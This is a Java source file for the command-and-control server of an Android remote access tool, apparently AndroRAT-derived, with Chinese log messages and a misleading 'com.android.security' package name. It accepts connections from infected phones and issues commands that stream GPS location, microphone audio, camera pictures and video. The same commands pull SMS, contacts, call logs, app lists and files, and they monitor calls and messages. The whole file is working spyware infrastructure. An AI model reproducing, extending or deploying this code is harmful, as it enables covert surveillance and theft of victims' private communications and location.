package com.android.security.gui.server;


import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Scanner;

import com.android.security.gui.GUI;
import com.android.security.handler.APPListHandler;
import com.android.security.handler.AdvInfoHandler;
import com.android.security.handler.CallLogHandler;
import com.android.security.handler.CallMonitorHandler;
import com.android.security.handler.ChannelDistributionHandler;
import com.android.security.handler.ClientLogHandler;
import com.android.security.handler.CommandHandler;
import com.android.security.handler.ContactsHandler;
import com.android.security.handler.FileHandler;
import com.android.security.handler.FileTreeHandler;
import com.android.security.handler.GPSHandler;
import com.android.security.handler.PacketHandler;
import com.android.security.handler.PictureHandler;
import com.android.security.handler.PreferenceHandler;
import com.android.security.handler.SMSHandler;
import com.android.security.handler.SMSMonitorHandler;
import com.android.security.handler.SoundHandler;
import com.android.security.handler.VideoHandler;
import com.android.security.inout.Controler;
import com.android.security.inout.Protocol;
import com.android.security.packages.APPListPacket;
import com.android.security.packages.AdvancedInformationPacket;
import com.android.security.packages.CallLogPacket;
import com.android.security.packages.CallStatusPacket;
import com.android.security.packages.CommandPacket;
import com.android.security.packages.ContactsPacket;
import com.android.security.packages.FilePacket;
import com.android.security.packages.FileTreePacket;
import com.android.security.packages.GPSPacket;
import com.android.security.packages.LogPacket;
import com.android.security.packages.Packet;
import com.android.security.packages.PreferencePacket;
import com.android.security.packages.RawPacket;
import com.android.security.packages.SMSTreePacket;
import com.android.security.packages.ShortSMSPacket;
import com.android.security.packages.TransportPacket;
 
public class Server implements Controler {

	private ServerSocket serverSocket;
	private int serverPort;
	private boolean online = true;
	private int Nclient;
	private GUI gui;

	private HashMap<String, ClientHandler> clientMap;
	private HashMap<String, ChannelDistributionHandler> channelHandlerMap;

	public Server(int port) {
		if(port == 0) {
			try {
	            Scanner sc = new Scanner(new FileInputStream("config.txt"));
	            if(sc.hasNextInt()) port = sc.nextInt();
			} catch (Exception e) {
				port = 9999;
			}
		}
		
		Nclient = 0;
		serverPort = port;
		clientMap = new HashMap<String, ClientHandler>();
		channelHandlerMap = new HashMap<String, ChannelDistributionHandler>();

		gui = new GUI(this, serverPort);
		//com.android.security.gui.addUser("coucou", null, null, null, null, null, null);
		try {
			serverSocket = new ServerSocket(serverPort);
		} catch (IOException e) {
			e.printStackTrace();
		}

		setOnline();

	}
	
	public static void main(String[] args) {
		Server s = new Server(0);
	}
	
	public void savePortConfig(String newPort) {
		try {
			BufferedWriter bw = new BufferedWriter(new FileWriter(new File("config.txt"), false));
			bw.write(newPort);
			bw.close();
		} catch (FileNotFoundException e) {
			gui.logErrTxt("无法找到配置文件 config.txt");
		} catch (IOException e) {
			gui.logErrTxt("无法更新配置文件 config.txt");
		}
	}

	public void setOnline() {
		while (online) {
			gui.logTxt("服务启动，等待客户端连接...");
			try {

				Socket cs = serverSocket.accept();

				// inscription temporaire d'un client connecte
				String id = Nclient + "client";
				ClientHandler newCH = new ClientHandler(cs, id, this, gui);
				clientMap.put(id, newCH);
				channelHandlerMap.put(id, new ChannelDistributionHandler());

				newCH.start();
				// System.out.println("client accept�");
				gui.logTxt("连接建立成功，客户端IMEI为： " + id);

			} catch (IOException e) {
				// e.printStackTrace();
				gui.logErrTxt("连接建立错误!");
			}
		}
		
		gui.logTxt("*** 服务终止 ***\n");
	}
	
	public void setOffline() {
		online = false;
	}


	public void Storage(TransportPacket p, String i) {
		int result = 0;
		int chan = p.getChannel();
		// System.out.println("PacketStorage recu sur le canal " + chan);
		//com.android.security.gui.logTxt("Receiving data from the channel: " + chan);

		if (!channelHandlerMap.containsKey(i)) {
			gui.logTxt("错误，获取未知客户端数据");
			return;
		} else if (channelHandlerMap.get(i).getPacketMap(chan) == null
				|| channelHandlerMap.get(i).getStorage(chan) == null) {

			gui.logErrTxt("错误：获取未注册信道数据!");
			return;
		} else
			result = channelHandlerMap.get(i).getStorage(chan).addPacket(p);

		if (result == Protocol.PACKET_LOST) {
			gui.logErrTxt("错误：丢数据包.");

		} else if (result == Protocol.NO_MORE) {
			gui.logErrTxt("错误：最后的数据包已经被接收.");

		} else if (result == Protocol.SIZE_ERROR) {
			gui.logErrTxt("错误：数据不完整，大小错误.");
		} else if (result == Protocol.ALL_DONE) {
			//com.android.security.gui.logTxt("Transfer completed successfully!");
			dataHandlerStarter(chan, i);
		}

	}

	// la m�thode permettant de retrouver le DataHandler en question et de
	// lancer le traitement de la donn�e re�ue
	public void dataHandlerStarter(int channel, String imei) {

		if (channelHandlerMap.get(imei).getStorage(channel) == null
				|| channelHandlerMap.get(imei).getPacketMap(channel) == null
				|| channelHandlerMap.get(imei).getPacketHandlerMap(channel) == null)

		{
			gui.logErrTxt("错误：句柄无效: "
					+ channel);
			return;
		}

		byte[] final_data = channelHandlerMap.get(imei).getStorage(channel)
				.getFinalData();

		// r�cup�ration du packet
		Packet p = channelHandlerMap.get(imei).getPacketMap(channel);
		p.parse(final_data);

		// r�cup�ration du gestionnaire du packet
		PacketHandler handler = channelHandlerMap.get(imei).getPacketHandlerMap(channel);

		// lancement du traitement
		handler.handlePacket(p, imei, this);
	}

	/**
	 * Method that affect Handler & Packet to the right channel in the
	 * ChannelDistributionHandler It send the target channel, the command and
	 * the optionnal argument to the mux (then the client)
	 * 
	 * @param imei
	 *            Id of the client
	 * @param command
	 *            Flag command from Protocol class
	 * @param args
	 *            Optionnal arguments that completes the flag command
	 */
	public void commandSender(String imei, short command, byte[] args) {
		int channel;
		try {
			channel = channelHandlerMap.get(imei).getFreeChannel();
		} catch(NullPointerException e) {
			gui.logErrTxt("客户端无效，不能发送命令: "+command);
			return;
		}
			
		if (command == Protocol.GET_GPS_STREAM) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new GPSPacket()))
				gui.logErrTxt("错误，虚拟信道 " + channel + " 已经注册!");
			gui.logTxt(" Protocol.GET_GPS_STREAM "+command);
			channelHandlerMap.get(imei).registerHandler(channel, new GPSHandler(channel, imei, gui));
			gui.saveMapChannel(imei, channel);
			
		} else if ((command == Protocol.GET_ADV_INFORMATIONS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new AdvancedInformationPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new AdvInfoHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_PREFERENCE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new PreferencePacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new PreferenceHandler(channel, imei, gui));
			
		} else if ((command == Protocol.GET_SOUND_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new SoundHandler(channel, imei, gui));
			gui.saveSoundChannel(imei, channel);
			
		} else if ((command == Protocol.GET_PICTURE)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new PictureHandler(channel, imei, gui));
			gui.savePictureChannel(imei, channel);
			
		} else if ((command == Protocol.LIST_DIR)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new FileTreePacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new FileTreeHandler(channel, imei, gui));
			
		}
		else if(command == Protocol.GET_APP_LIST)
		{
			gui.logTxt("GET_APP_LIST");
			if (!channelHandlerMap.get(imei).registerListener(channel, new APPListPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new APPListHandler(channel, imei, gui));
		}
		else if ((command == Protocol.GET_CALL_LOGS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallLogPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallLogHandler(channel, imei, gui));
			gui.saveCallLogChannel(imei, channel);
			
		} else if ((command == Protocol.GET_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new SMSTreePacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSHandler(channel, imei, gui));
			gui.saveSMSChannel(imei, channel);
			
		} else if ((command == Protocol.GET_CONTACTS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ContactsPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new ContactsHandler(channel, imei, gui));
			gui.saveContactChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_CALL)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new CallStatusPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new CallMonitorHandler(channel, imei, gui));
			gui.saveMonitorCallChannel(imei, channel);
			
		} else if ((command == Protocol.MONITOR_SMS)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new ShortSMSPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new SMSMonitorHandler(channel, imei, gui));
			gui.saveMonitorSMSChannel(imei, channel);
			
		} else if (command == Protocol.CONNECT) {
			channelHandlerMap.get(imei).registerListener(channel, new CommandPacket());
			channelHandlerMap.get(imei).registerListener(1, new LogPacket());
			channelHandlerMap.get(imei).registerHandler(1, new ClientLogHandler(channel, imei, gui));
		} 
		else if ((command == Protocol.GET_VIDEO_STREAM)) {
			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
				gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
			channelHandlerMap.get(imei).registerHandler(channel, new VideoHandler(channel, imei, gui));
			gui.saveVideoChannel(imei, channel);
		}
		else if((command == Protocol.AIRPLANE_MODE))
		{
			
		}
		else if (command == Protocol.STOP_GPS_STREAM) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof GPSPacket));
			channelHandlerMap.get(imei).removeListener(c);
		}

		else if (command == Protocol.STOP_MONITOR_SMS) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof SMSMonitorHandler));
			channelHandlerMap.get(imei).removeListener(c);
		} else if (command == Protocol.STOP_SOUND_STREAM) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof SoundHandler));
			channelHandlerMap.get(imei).removeListener(c);
		} else if (command == Protocol.STOP_VIDEO_STREAM) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof VideoHandler));
			channelHandlerMap.get(imei).removeListener(c);
		}

		else if (command == Protocol.STOP_MONITOR_SMS) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof SMSMonitorHandler));
			channelHandlerMap.get(imei).removeListener(c);
		} else if (command == Protocol.STOP_MONITOR_CALL) {
			PacketHandler p = new CommandHandler();
			int c = 0;
			do {
				c++;
				if (channelHandlerMap.get(imei).getPacketHandlerMap(c) != null)
					p = channelHandlerMap.get(imei).getPacketHandlerMap(c);
			} while (!(p instanceof CallMonitorHandler));
			channelHandlerMap.get(imei).removeListener(c);
		}

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}
	
	public void commandFileSender(String imei, short command, byte[] args, String dir, String name) {
		int channel = channelHandlerMap.get(imei).getFreeChannel();
		
		if (!channelHandlerMap.get(imei).registerListener(channel, new FilePacket())) 
			gui.logErrTxt("错误：信道 " + channel + " 正在使用中!");
		
		channelHandlerMap.get(imei).registerHandler(channel, new FileHandler(channel, imei, gui, dir, name));
		//com.android.security.gui.saveFileChannel(imei, channel);
		
		byte[] nullArgs = new byte[0];
		if (args == null) args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}

	public void commandStopSender(String imei, short command, byte[] args,
			int channel) {

		channelHandlerMap.get(imei).removeListener(channel);

		byte[] nullArgs = new byte[0];
		if (args == null)
			args = nullArgs;
		clientMap.get(imei).toMux(command, channel, args);
	}
	
	public void DeleteClientHandler(String i)
	{
		if (this.clientMap.containsKey(i)) {
			clientMap.get(i).disconnect();
			this.clientMap.remove(i);
		}
		if (this.channelHandlerMap.containsKey(i)) {
			this.channelHandlerMap.remove(i);
		}
		gui.deleteUser(i);
		gui.logTxt("因掉线客户端[" + i + "]已被删除");

	}

	public GUI getGui() {
		return gui;
	}

	public HashMap<String, ClientHandler> getClientMap() {
		return clientMap;
	}

	public HashMap<String, ChannelDistributionHandler> getChannelHandlerMap() {
		return channelHandlerMap;
	}
}
